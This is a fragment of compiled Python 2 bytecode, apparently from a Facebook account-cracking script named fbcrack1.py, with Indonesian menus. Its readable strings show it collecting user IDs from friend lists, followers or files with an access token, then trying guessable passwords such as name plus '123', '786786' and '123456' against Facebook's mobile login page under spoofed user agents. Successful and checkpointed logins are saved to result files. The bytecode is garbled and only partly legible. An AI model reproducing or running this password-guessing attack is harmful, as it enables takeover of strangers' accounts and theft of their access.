 �  t j | � n  Wn n Xd  S(!   NR   s   https://graph.facebook.com/s   /?access_token=R�   R�   s%   https://mbasic.facebook.com/login.phpRn   R<   R=   R]   R8   R|   s7  Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]s
   user-agentR�   s   save-devices   [0;92m[OK][0;97m s    [0;92m◊ [0;97mRr   s   done/bangla.txtRp   s   
[OK] s    ◊ RP   s   [0;93m[CP][0;97m s    [0;91m◊[0;97m s    [0;91m◊ [0;97ms   
[CP] R�   R�   t   102030s    [0;92m◊ 033[0;97m(   R   R�   R�   Rc   Rd   Rj   Re   Rf   Rg   R�   R�   RQ   R   Rh   R�   R�   R�   (   R�   R�   R�   RJ   t   pzR�   R�   R�   R�   t   pz2t   pz3t   pz4(    (    s   /sdcard/fbcrack1.pyR�   %  s�    
7	

7	

7	

7	

i   s�   
[0;94m──────────────────────────────────────────────────s-   [1;97m([1;94m•[1;97m) [1;97mSelesai ...sS   [1;97m([1;94m•[1;97m) [1;97mTotal [1;92mOK[1;97m/[1;93mCP [1;97m: [1;92ms   [1;97m/[1;93ms]   [1;97m([1;94m•[1;97m) [1;97mSalin hasil crack lalu simpan[1;91m:[1;97mdone bangla.txti2   s
   [1;94m─s   [1;97m([1;91mKembali[1;97m) (#   R-   R�   R   R#   R�   R
   R   Rc   Rd   Rj   Re   Rf   Rg   Rk   R�   RS   R�   Ri   R   R   RQ   R�   R�   RT   R�   R�   R�   R	   R
   R   R    R�   R�   R�   RR   (   R�   R:   R   R�   R�   R�   R�   R�   R�   R�   R   R   R�   R�   (    (    s   /sdcard/fbcrack1.pyR�   �  s�    
























	L)	
c           C   s�   t  j d � y t d d � j �  a Wn7 t k
 r_ d GHt  j d � t j d � t �  n Xt  j d � t	 GHd GHt j d � d	 GHt j d � d
 GHt j d � d GHt j d � d GHt j d � d GHt j d � t
 �  d  S(
   NR   s	   login.txtR:   s   ([0;91m![0;97m) Token Invalids   rm -rf login.txti   s�   [0;91m──────────────────────────────────────────────────g�Q���?s)   [0;97m1).[0;97m Crack Dari Daftar Temans)   [0;97m2).[0;97m Crack Dari Publik/Temans!   [0;97m3).[0;97m Crack Dari Files    [0;91m0[0;97m).[0;97m Kembali(   R   R#   RQ   R�   Rj   RT   R
   R   R   R�   t   pilih_pakis(    (    (    s   /sdcard/fbcrack1.pyR�   |  s.    










c          C   s
  t  d � }  |  d k r' d GHt �  n|  d k r� t j d � t GHd GHt j d � t j d t	 � } t
 j | j � } x�| d	 D] } t
 j | d
 � q� Wn�|  d k r�t j d � t GHd GHt j d � t  d � } t j d � y> t j d
 | d t	 � } t
 j | j � } d | d GHWnI t k
 rUd GHt  d � t �  n# t j j k
 rwd GHt �  n Xt j d
 | d t	 � } t
 j | j � } x,| d	 D] } t
 j | d
 � q�Wn|  d k s�|  d k r�t j d � t GHyb d GHt j d � t  d � } t j d � x0 t | d � j �  D] }	 t
 j |	 j �  � q<WWq�t k
 r|d GHt  d � q�t k
 r�d GHt  d � t �  q�Xn. |  d k s�|  d k r�t �  n d GHt �  d t t t
 � � GHt j d � d d  d! g }
 x0 |
 D]( } d" | Gt j j �  t j d# � qWd$ GHt j d � d% GHt j d � d& GHt j d � d' GHt j d � d GHt j d � d( �  } t d) � }
 |
 j | t
 � d* GHd+ GHd, t t t  � � d- t t t! � � GHd. GHd/ d0 GHt  d1 � t" �  d  S(2   Ns    [1;97m(?) Pilih [94m> [1;97m R'   s   ([0;91m![0;97m) Isi Yg BenarR(   R   s�   [0;91m──────────────────────────────────────────────────g�Q���?s3   https://graph.facebook.com/me/friends?access_token=Rn   Rk   R)   s5   [1;97m([0;94m•[0;97m) ID Publik [0;91m:[0;97m s   https://graph.facebook.com/s   ?access_token=s0   [1;97m([0;94m•[0;97m) Nama [0;91m:[0;97m Rr   s+   ([0;91m![0;97m) ID publik/teman tidak adas   
[1;97m([1;91mKembali[1;97m)s*   [1;97m([0;91m![0;97m) Tidak ada koneksis   /friends?access_token=R*   R�   s<   [1;97m([1;94m•[1;97m) [1;97mNama File[1;91m :[1;97m R:   s#   ([0;91m![0;97m) File tidak ada ! s   [1;97m([1;91mKembali[1;97m)s"   ([0;91m![0;97m) File tidak ada !R,   R�   s4   [0;97m([0;94m•[0;97m) Total Id[1;91m :[1;97m s   .   s   ..  s   ... s$   
([0;94m•[0;97m) Crack Berjalan i   s�   
[0;91m──────────────────────────────────────────────────s9   [0;97m  Lama Hasil Gunakan Mode Perawan 3 Detik Joss👍s4   [0;97m    Untuk Menghentikan Proses, Tekan CTRL + zs7   [0;97m  Sedang Proses Mohon Bersabar, Semoga Beruntungc   
      S   sJ  |  } y t  j d � Wn t k
 r* n Xyt j d | d t � } t j | j � } | d d } t j	 d d i | d 6| d	 6d
 d 6d i d
 d 6�} | j
 } d | k s� d | k r d | d | d | d GHt d d � } | j d | d | � | j
 �  t j | � nd | k r�d | d | d | d GHt d d � } | j d | d | � | j
 �  t j | � n�d }	 t j	 d d i | d 6|	 d	 6d
 d 6d i d
 d 6�} | j
 } d | k s�d | k rHd | d |	 d | d GHt d d � } | j d | d |	 � | j
 �  t j | � n�d | k r�d | d |	 d | d GHt d d � } | j d | d |	 � | j
 �  t j | � n�| d d }
 t j	 d d i | d 6|
 d	 6d
 d 6d i d
 d 6�} | j
 } d | k sd | k rxd | d |
 d | d GHt d d � } | j d | d |
 � | j
 �  t j | � n�d | k r�d | d |
 d | d GHt d d � } | j d | d |
 � | j
 �  t j | � nX| d d } t j	 d d i | d 6| d	 6d
 d 6d i d
 d 6�} | j
 } d | k sId | k r�d | d | d | d GHt d d � } | j d | d | � | j
 �  t j | � n�d | k rd | d | d | d GHt d d � } | j d | d | � | j
 �  t j | � n(d  } t j	 d d i | d 6| d	 6d
 d 6d i d
 d 6�} | j
 } d | k sqd | k r�d | d | d | d GHt d d � } | j d | d | � | j
 �  t j | � nk d | k r;d | d | d | d GHt d d � } | j d | d | � | j
 �  t j | � n  Wn n Xd  S(!   NR   s   https://graph.facebook.com/s   /?access_token=R�   R�   s%   https://mbasic.facebook.com/login.phpRn   R<   R=   R]   R8   R|   s7  Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]s
   user-agentR�   s   save-devices   [0;92m[OK][0;97m s    [0;92m◊ [0;97mRr   s   done/pakis.txtRp   s   
[OK] s    ◊ RP   s   [0;93m[CP][0;97m s    [0;91m◊[0;97m s    [0;91m◊ [0;97ms   
[CP] t   786786R�   R�   t   000786(   R   R�   R�   Rc   Rd   Rj   Re   Rf   Rg   R�   R�   RQ   R   Rh   R�   R�   R�   (
   t   artt   eft   ahR�   t   pbt   rept   xsR�   R�   t   pb2t   pb3t   pb4t   pb5(    (    s   /sdcard/fbcrack1.pyR�   �  s�    
7	

7	

7	

7	

7	

i   s�   
[1;94m──────────────────────────────────────────────────s-   [1;97m([1;94m•[1;97m) [1;97mSelesai ...sS   [1;97m([1;94m•[1;97m) [1;97mTotal [1;92mOK[1;97m/[1;93mCP [1;97m: [1;92ms   [1;97m/[1;93ms^   [1;97m([1;94m•[1;97m) [1;97mSalin hasil crack lalu simpan[1;91m : [1;97mdone pakis.txti2   s
   [1;94m─s   [1;97m([1;91mKembali[1;97m) (#   R-   R�   R   R#   R�   R
   R   Rc   Rd   Rj   Re   Rf   Rg   Rk   R�   RS   R�   Ri   R   R   RQ   R�   R�   RT   R�   R�   R�   R	   R
   R   R    R�   R�   R�   RR   (   R�   R:   R   R�   R�   R�   R�   R�   R�   R�   R   R   R�   R�   (    (    s   /sdcard/fbcrack1.pyR�   �  s�    
























	\)	
c           C   s�   t  j d � y t d d � j �  a Wn7 t k
 r_ d GHt  j d � t j d � t �  n Xt  j d � t	 GHd GHt j d � d	 GHt j d � d
 GHt j d � d GHt j d � d GHt j d � d GHt j d � t
 �  d  S(
   NR   s	   login.txtR:   s   ([0;91m![0;97m) Token Invalids   rm -rf login.txti   s�   [0;91m──────────────────────────────────────────────────g�Q���?s)   [0;97m1).[0;97m Crack Dari Daftar Temans)   [0;97m2).[0;97m Crack Dari Publik/Temans!   [0;97m3).[0;97m Crack Dari Files    [0;91m0[0;97m).[0;97m Kembali(   R   R#   RQ   R�   Rj   RT   R
   R   R   R�   t   pilih_hindi(    (    (    s   /sdcard/fbcrack1.pyR�   S  s.    










c          C   s
  t  d � }  |  d k r' d GHt �  n|  d k r� t j d � t GHd GHt j d � t j d t	 � } t
 j | j � } x�| d	 D] } t
 j | d
 � q� Wn�|  d k r�t j d � t GHd GHt j d � t  d � } t j d � y> t j d
 | d t	 � } t
 j | j � } d | d GHWnI t k
 rUd GHt  d � t �  n# t j j k
 rwd GHt �  n Xt j d
 | d t	 � } t
 j | j � } x,| d	 D] } t
 j | d
 � q�Wn|  d k s�|  d k r�t j d � t GHyb d GHt j d � t  d � } t j d � x0 t | d � j �  D] }	 t
 j |	 j �  � q<WWq�t k
 r|d GHt  d � q�t k
 r�d GHt  d � t �  q�Xn. |  d k s�|  d k r�t �  n d GHt �  d t t t
 � � GHt j d � d d  d! g }
 x0 |
 D]( } d" | Gt j j �  t j d# � qWd$ GHt j d � d% GHt j d � d& GHt j d � d' GHt j d � d GHt j d � d( �  } t d) � }
 |
 j | t
 � d* GHd+ GHd, t t t  � � d- t t t! � � GHd. GHd/ d0 GHt  d1 � t" �  d  S(2   Ns    [1;97m(?) Pilih [94m> [1;97m R'   s   ([0;91m![0;97m) Isi Yg BenarR(   R   s�   [0;91m──────────────────────────────────────────────────g�Q���?s3   https://graph.facebook.com/me/friends?access_token=Rn   Rk   R)   s5   [1;97m([0;94m•[0;97m) ID Publik [0;91m:[0;97m s   https://graph.facebook.com/s   ?access_token=s0   [1;97m([0;94m•[0;97m) Nama [0;91m:[0;97m Rr   s+   ([0;91m![0;97m) ID publik/teman tidak adas   
[1;97m([1;91mKembali[1;97m)s*   [1;97m([0;91m![0;97m) Tidak ada koneksis   /friends?access_token=R*   R�   s<   [1;97m([1;94m•[1;97m) [1;97mNama File[1;91m :[1;97m R:   s#   ([0;91m![0;97m) File tidak ada ! s   [1;97m([1;91mKembali[1;97m)s"   ([0;91m![0;97m) File tidak ada !R,   R�   s4   [0;97m([0;94m•[0;97m) Total Id[1;91m :[1;97m s   .   s   ..  s   ... s$   
([0;94m•[0;97m) Crack Berjalan i   s�   
[0;91m──────────────────────────────────────────────────s9   [0;97m  Lama Hasil Gunakan Mode Perawan 3 Detik Joss👍s4   [0;97m    Untuk Menghentikan Proses, Tekan CTRL + zs7   [0;97m  Sedang Proses Mohon Bersabar, Semoga Beruntungc         S   s"  |  } y t  j d � Wn t k
 r* n Xy�t j d | d t � } t j | j � } d } t j	 d d i | d 6| d 6d	 d
 6d i d d
 6�} | j
 } d | k s� d | k rd | d | d | d GHt d d � } | j d | d | � | j
 �  t j | � n�d | k r�d | d | d | d GHt d d � } | j d | d | � | j
 �  t j | � n�| d d }	 t j	 d d i | d 6|	 d 6d	 d
 6d i d d
 6�} | j
 } d | k s�d | k rHd | d |	 d | d GHt d d � } | j d | d |	 � | j
 �  t j | � n�d | k r�d | d |	 d | d GHt d d � } | j d | d |	 � | j
 �  t j | � n`| d d }
 t j	 d d i | d 6|
 d 6d	 d
 6d i d  d
 6�} | j
 } d | k sd | k rxd | d |
 d | d GHt d d � } | j d | d |
 � | j
 �  t j | � n�d | k r�d | d |
 d | d GHt d d � } | j d | d |
 � | j
 �  t j | � n0| d d! } t j	 d d i | d 6| d 6d	 d
 6d i d" d
 6�} | j
 } d | k sId | k r�d | d | d | d GHt d d � } | j d | d | � | j
 �  t j | � nk d | k rd | d | d | d GHt d d � } | j d | d | � | j
 �  t j | � n  Wn n Xd  S(#   NR   s   https://graph.facebook.com/s   /?access_token=R�   s%   https://mbasic.facebook.com/login.phpRn   R<   R=   R]   R8   R|   si   Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1s
   user-agentR�   s   save-devices   [0;92m[OK][0;97m s    [0;92m◊ [0;97mRr   s   done/hindi.txtRp   s   
[OK] s    ◊ RP   s   [0;93m[CP][0;97m s    [0;91m◊[0;97m s    [0;91m◊ [0;97ms   
[CP] R�   R�   s�   Mozilla/5.0 (Linux; Android 7.1.2; AFTMM Build/NS6265; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36R�   s�   Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G Build/MMB29T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.83 Mobile Safari/537.36R�   s�   Mozilla/5.0 (Linux; Android 7.0; SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36(   R   R�   R�   Rc   Rd   Rj   Re   Rf   Rg   R�   R�   RQ   R   Rh   R�   R�   R�   (   R�   R�   R�   R�   R�   R�   R�   R�   R�   R�   R�   R�   (    (    s   /sdcard/fbcrack1.pyR�   �  s�    
7	

7	

7	

7	

i   s�   
[1;94m──────────────────────────────────────────────────s-   [1;97m([1;94m•[1;97m) [1;97mSelesai ...sS   [1;97m([1;94m•[1;97m) [1;97mTotal [1;92mOK[1;97m/[1;93mCP [1;97m: [1;92ms   [1;97m/[1;93ms^   [1;97m([1;94m•[1;97m) [1;97mSalin hasil crack lalu simpan[1;91m : [1;97mdone hindi.txti2   s
   [1;94m─s   [1;97m([1;91mKembali[1;97m) (#   R-   R�   R   R#   R�   R
   R   Rc   Rd   Rj   Re   Rf   Rg   Rk   R�   RS   R�   Ri   R   R   RQ   R�   R�   RT   R�   R�   R�   R	   R
   R   R    R�   R�   R�   RR   (   R�   R:   R   R�   R�   R�   R�   R�   R�   R�   R   R   R�   R�   (    (    s   /sdcard/fbcrack1.pyR�   o  s�    
























	M)	
c           C   s�   t  j d � y t d d � j �  a Wn7 t k
 r_ d GHt  j d � t j d � t �  n Xt  j d � t	 GHd GHt j d � d	 GHt j d � d
 GHt j d � d GHt j d � d GHt j d � d GHt j d � t
 �  d  S(
   NR   s	   login.txtR:   s   ([0;91m![0;97m) Token Invalids   rm -rf login.txti   s�   [0;91m──────────────────────────────────────────────────g�Q���?s)   [0;97m1).[0;97m Crack Dari Daftar Temans)   [0;97m2).[0;97m Crack Dari Publik/Temans!   [0;97m3).[0;97m Crack Dari Files    [0;91m0[0;97m).[0;97m Kembali(   R   R#   RQ   R�   Rj   RT   R
   R   R   R�   t	   pilih_usa(    (    (    s   /sdcard/fbcrack1.pyR�     s.    










c          C   s
  t  d � }  |  d k r' d GHt �  n|  d k r� t j d � t GHd GHt j d � t j d t	 � } t
 j | j � } x�| d	 D] } t
 j | d
 � q� Wn�|  d k r�t j d � t GHd GHt j d � t  d � } t j d � y> t j d
 | d t	 � } t
 j | j � } d | d GHWnI t k
 rUd GHt  d � t �  n# t j j k
 rwd GHt �  n Xt j d
 | d t	 � } t
 j | j � } x,| d	 D] } t
 j | d
 � q�Wn|  d k s�|  d k r�t j d � t GHyb d GHt j d � t  d � } t j d � x0 t | d � j �  D] }	 t
 j |	 j �  � q<WWq�t k
 r|d GHt  d � q�t k
 r�d GHt  d � t �  q�Xn. |  d k s�|  d k r�t �  n d GHt �  d t t t
 � � GHt j d � d d  d! g }
 x0 |
 D]( } d" | Gt j j �  t j d# � qWd$ GHt j d � d% GHt j d � d& GHt j d � d' GHt j d � d GHt j d � d( �  } t d) � }
 |
 j | t
 � d$ GHd* GHd+ t t t  � � d, t t t! � � GHd- GHd. d/ GHt  d0 � t" �  d  S(1   Ns    [1;97m(?) Pilih [94m> [1;97m R'   s   ([0;91m![0;97m) Isi Yg BenarR(   R   s�   [0;91m──────────────────────────────────────────────────g�Q���?s3   https://graph.facebook.com/me/friends?access_token=Rn   Rk   R)   s5   [1;97m([0;94m•[0;97m) ID Publik [0;91m:[0;97m s   https://graph.facebook.com/s   ?access_token=s0   [1;97m([0;94m•[0;97m) Nama [0;91m:[0;97m Rr   s%   ([0;91m![0;97m) ID publik tidak adas   
[1;97m([1;91mKembali[1;97m)s*   [1;97m([0;91m![0;97m) Tidak ada koneksis   /friends?access_token=R*   R�   s<   [1;97m([1;94m•[1;97m) [1;97mNama File[1;91m :[1;97m R:   s#   ([0;91m![0;97m) File tidak ada ! s   [1;97m([1;91mKembali[1;97m)s"   ([0;91m![0;97m) File tidak ada !R,   R�   s4   [0;97m([0;94m•[0;97m) Total Id[1;91m :[1;97m s   .   s   ..  s   ... s$   
([0;94m•[0;97m) Crack Berjalan i   s�   
[0;91m──────────────────────────────────────────────────s9   [0;97m  Lama Hasil Gunakan Mode Perawan 3 Detik Joss👍s4   [0;97m    Untuk Menghentikan Proses, Tekan CTRL + zs7   [0;97m  Sedang Proses Mohon Bersabar, Semoga Beruntungc         S   s"  |  } y t  j d � Wn t k
 r* n Xy�t j d | d t � } t j | j � } | d d } t j	 d d i | d 6| d	 6d
 d 6d i d
 d 6�} | j
 } d | k s� d | k r d | d | d | d GHt d d � } | j d | d | � | j
 �  t j | � n�d | k r�d | d | d | d GHt d d � } | j d | d | � | j
 �  t j | � n�| d d }	 t j	 d d i | d 6|	 d	 6d
 d 6d i d
 d 6�} | j
 } d | k s�d | k rPd | d |	 d | d GHt d d � } | j d | d |	 � | j
 �  t j | � n�d | k r�d | d |	 d | d GHt d d � } | j d | d |	 � | j
 �  t j | � nX| d d }
 t j	 d d i | d 6|
 d	 6d
 d 6d i d d  6�} | j
 } d | k s!d | k r�d | d |
 d | d GHt d d � } | j d | d |
 � | j
 �  t j | � n�d | k r�d | d |
 d | d GHt d d � } | j d | d |
 � | j
 �  t j | � n(d! } t j	 d d i | d 6| d	 6d
 d 6d i d d  6�} | j
 } d | k sId | k r�d | d | d | d GHt d d � } | j d | d | � | j
 �  t j | � nk d | k rd | d | d | d GHt d d � } | j d | d | � | j
 �  t j | � n  Wn n Xd  S("   NR   s   https://graph.facebook.com/s   /?access_token=R�   R�   s%   https://mbasic.facebook.com/login.phpRn   R<   R=   R]   R8   R|   s�  Mozilla/5.0 (Linux; Android 9; Infinix X652B Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.81 Mobile Safari/537.36 [FBAN/FB4A;FBAV/286.0.0.48.112;FBBV/242171848;FBDM/{density=2.0,width=720,height=1428};FBLC/en_US;FBRV/243389251;FBCR/Warid;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix X652B;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]s
   User-AgentR�   s   save-devices   [0;92m[OK][0;97m s    [0;92m◊ [0;97mRr   s   done/usa.txtRp   s   
[OK] s    ◊ RP   s   [0;93m[CP][0;97m s    [0;91m◊[0;97m s    [0;91m◊ [0;97ms   
[CP] R�   R�   s  Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]s
   user-agentt   123456(   R   R�   R�   Rc   Rd   Rj   Re   Rf   Rg   R�   R�   RQ   R   Rh   R�   R�   R�   (   R�   R�   R�   RJ   t   pxR�   R�   R�   R�   t   px2t   px3t   px4(    (    s   /sdcard/fbcrack1.pyR�   �  s�    
7	

7	

7	

7	

i   s-   [1;97m([1;94m•[1;97m) [1;97mSelesai ...sS   [1;97m([1;94m•[1;97m) [1;97mTotal [1;92mOK[1;97m/[1;93mCP [1;97m: [1;92ms   [1;97m/[1;93ms\   [1;97m([1;94m•[1;97m) [1;97mSalin hasil crack lalu simpan[1;91m : [1;97mdone usa.txti2   s
   [1;91m─s   [1;97m([1;91mKembali[1;97m) (#   R-   R�   R   R#   R�   R
   R   Rc   Rd   Rj   Re   Rf   Rg   Rk   R�   RS   R�   Ri   R   R   RQ   R�   R�   RT   R�   R�   R�   R	   R
   R   R    R�   R�   R�   RR   (   R�   R:   R   R�   R�   R�   R�   R�   R�   R�   R   R   R�   R�   (    (    s   /sdcard/fbcrack1.pyR�   7  s�    
























	L)	
c           C   s�   t  j d � y t d d � j �  a Wn7 t k
 r_ d GHt  j d � t j d � t �  n Xt  j d � t	 GHd GHt j d � d	 GHt j d � d
 GHt j d � d GHt j d � d GHt j d � t
 �  d  S(   NR   s	   login.txtR:   s&   [1;97m([1;91m![1;97m) Token Invalids   rm -rf login.txti   s�   [0;91m──────────────────────────────────────────────────g�Q���?s+   [0;97m1). [0;97m Crack Dari Follower Sayas,   [0;97m2). [0;97m Crack Dari Follower Temans    [0;91m0[0;97m).[0;97m Kembali(   R   R#   RQ   R�   Rj   RT   R
   R   R   R$   t   pilih_follow(    (    (    s   /sdcard/fbcrack1.pyR�   �  s*    









c          C   s)  t  d � }  |  d k r' d GHt �  n-|  d k r� t j d � t GHd GHt j d � t j d t	 � } t
 j | j � } x�| d	 D] } t
 j | d
 � q� Wn�|  d k r�t j d � t GHd GHt j d � t  d � } t j d � y> t j d
 | d t	 � } t
 j | j � } d | d GHWnI t k
 rUd GHt  d � t �  n# t j j k
 rwd GHt �  n Xt j d
 | d t	 � } t
 j | j � } xH | d	 D] } t
 j | d
 � q�Wn" |  d k r�t �  n d GHt �  d t t t
 � � GHt j d � d d d g } x0 | D]( }	 d |	 Gt j j �  t j d � q(Wd GHt j d � d GHt j d � d GHt j d � d GHt j d � d GHt j d � d  �  }
 t d! � } | j |
 t
 � d" GHd# GHd$ t t t � � d% t t t � � GHd& GHd' d( GHt  d) � t �  d  S(*   Ns   [0;93m>[0;97m R'   s%   [1;97m([1;91m![1;97m) Isi Yg BenarR(   R   s�   [0;91m──────────────────────────────────────────────────g�Q���?sD   https://graph.facebook.com/me/subscribers?limit=999999&access_token=Rn   Rk   R)   s3   [1;97m([1;91m![1;97m) ID Publik [0;91m:[0;97m s   https://graph.facebook.com/s   ?access_token=s0   [1;97m([1;94m•[1;97m) Nama [0;91m:[0;97m Rr   s,   [1;97m([1;91m![1;97m) ID publik tidak adas   
[1;97m([0;91mKembali[0;97m)s*   [1;97m([1;91m![1;97m) Tidak ada koneksis'   /subscribers?limit=999999&access_token=R,   s6   [0;97m([0;94m•[0;97m) Jumlah ID[1;91m  :[1;97m s   .   s   ..  s   ... s$   
([0;94m•[0;97m) Crack Berjalan i   s�   
[0;91m──────────────────────────────────────────────────s9   [0;97m  Lama Hasil Gunakan Mode Perawan 3 Detik Joss👍s4   [0;97m    Untuk Menghentikan Proses, Tekan CTRL + zs7   [0;97m  Sedang Proses Mohon Bersabar, Semoga Beruntungc         S   s  |  } y t  j d � Wn t k
 r* n Xy�t j d | d t � } t j | j � } | d d } t j	 d d i | d 6| d	 6d
 d 6d i d
 d 6�} | j
 } d | k s� d | k r d | d | d | d GHt d d � } | j d | d | � | j
 �  t j | � n�d | k r�d | d | d | d GHt d d � } | j d | d | � | j
 �  t j | � nt| d d }	 t j	 d d i | d 6|	 d	 6d
 d 6d i d
 d 6�} | j
 } d | k s�d | k rPd | d |	 d | d GHt d d � } | j d | d |	 � | j
 �  t j | � n�d | k r�d | d |	 d | d GHt d d � } | j d | d |	 � | j
 �  t j | � nD| d d }
 t j	 d d i | d 6|
 d	 6d
 d 6d i d
 d 6�} | j
 } d | k s!d | k r�d | d |
 d | d GHt d d � } | j d | d |
 � | j
 �  t j | � nd | k r�d | d |
 d | d GHt d d � } | j d | d |
 � | j
 �  t j | � n| d d } t j	 d d d d
 h �} | j
 } d | k s5d | k r�d | d | d | d GHt d d � } | j d | d | � | j
 �  t j | � nk d | k r�d | d | d | d GHt d d � } | j d | d | � | j
 �  t j | � n  Wn n Xd  S(    NR   s   https://graph.facebook.com/s   /?access_token=R�   R�   s%   https://mbasic.facebook.com/login.phpRn   R<   R=   R]   R8   R|   s  Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]s
   user-agentR�   s   save-devices   [0;92m[OK][0;97m s    [0;92m◊ [0;97mRr   s   done/follow.txtRp   s   
[OK] s    ◊ RP   s   [0;93m[CP][0;97m s    [0;91m◊[0;97m s    [0;91m◊ [0;97ms   
[CP] R�   R�   t   321(   R   R�   R�   Rc   Rd   Rj   Re   Rf   Rg   R�   R�   RQ   R   Rh   R�   R�   R�   (   R�   R�   R�   RJ   t   prR�   R�   R�   R�   t   pr2t   pr3t   pr4(    (    s   /sdcard/fbcrack1.pyR�   =  s�    
7	

7	

7	

	

i   s�   
[1;94m──────────────────────────────────────────────────s-   [1;97m([1;94m•[1;97m) [1;97mSelesai ...sS   [1;97m([1;94m•[1;97m) [1;97mTotal [1;92mOK[1;97m/[1;93mCP [1;97m: [1;92ms   [1;97m/[1;93ms_   [1;97m([1;94m•[1;97m) [1;97mSalin hasil crack lalu simpan[1;91m : [1;97mdone follow.txti2   s
   [1;94m─s   [1;97m([1;91mKembali[1;97m) (   R-   R�   R   R#   R�   R
   R   Rc   Rd   Rj   Re   Rf   Rg   Rk   R�   R$   RS   R�   Ri   R   R   RR   R�   R�   R	   R
   R   R    R�   R�   R�   (   t   keakR:   R   R�   R�   R�   R�   R�   R   R   R�   R�   (    (    s   /sdcard/fbcrack1.pyR�   �  s�    

















	L)	
c           C   s�   t  j d � y t d d � j �  a Wn7 t k
 r_ d GHt  j d � t j d � t �  n Xt  j d � t	 GHd GHt j d � d	 GHt j d � d
 GHt j d � d GHt j d � d GHt j d � d GHt j d � t
 �  d  S(
   NR   s	   login.txtR:   s&   [1;97m([1;91m![1;97m) Token Invalids   rm -rf login.txti   s�   [0;91m──────────────────────────────────────────────────g�Q���?s)   [0;97m1).[0;97m Crack Dari Daftar Temans)   [0;97m2).[0;97m Crack Dari Publik/Temans!   [0;97m3).[0;97m Crack Dari Files    [0;91m0[0;97m).[0;91m Kembali(   R   R#   RQ   R�   Rj   RT   R
   R   R   R�   t   pilih_manual(    (    (    s   /sdcard/fbcrack1.pyR�   �  s.    










c             sV  t  d � }  |  d k r' d GHt �  n|  d k r� t j d � t GHd GHt j d � t j d t	 � } t
 j | j � } x�| d	 D] } t
 j | d
 � q� Wn�|  d k r�t j d � t GHd GHt j d � t  d � } t j d � y> t j d
 | d t	 � } t
 j | j � } d | d GHWnI t k
 rUd GHt  d � t �  n# t j j k
 rwd GHt �  n Xt j d
 | d t	 � } t
 j | j � } x,| d	 D] } t
 j | d
 � q�Wn|  d k s�|  d k r�t j d � t GHyb d GHt j d � t  d � } t j d � x0 t | d � j �  D] }	 t
 j |	 j �  � q<WWq�t k
 r|d GHt  d � q�t k
 r�d GHt  d � t �  q�Xn. |  d k s�|  d k r�t �  n d GHt �  d  t t t
 � � GHt j d � d! d" d# g }
 x0 |
 D]( } d$ | Gt j j �  t j d% � qWd GHt d& � t  d' � �  t  d( � � t  d) � � t d* � d GHt j d � d+ GHt j d � d, GHt j d � d- GHt j d � d GHt j d � �  � � f d. �  } t d/ � }
 |
 j | t
 � d0 GHd1 GHd2 t t t  � � d3 t t t! � � GHd4 GHd5 d6 GHt  d � t" �  d  S(7   Ns-   [0;97m([0;93m?[0;97m) Pilih [94m>[0;93m R'   s%   [1;97m([1;91m![1;97m) Isi Yg BenarR(   R   s�   [0;91m──────────────────────────────────────────────────g�Q���?s3   https://graph.facebook.com/me/friends?access_token=Rn   Rk   R)   s3   [1;97m([0;94m•[0;97m) User Id [0;91m:[0;97m s   https://graph.facebook.com/s   ?access_token=s0   [1;97m([0;94m•[0;97m) Nama [0;91m:[0;97m Rr   s.   [1;97m([1;91m![1;97m) Id publik tidak ada !s   
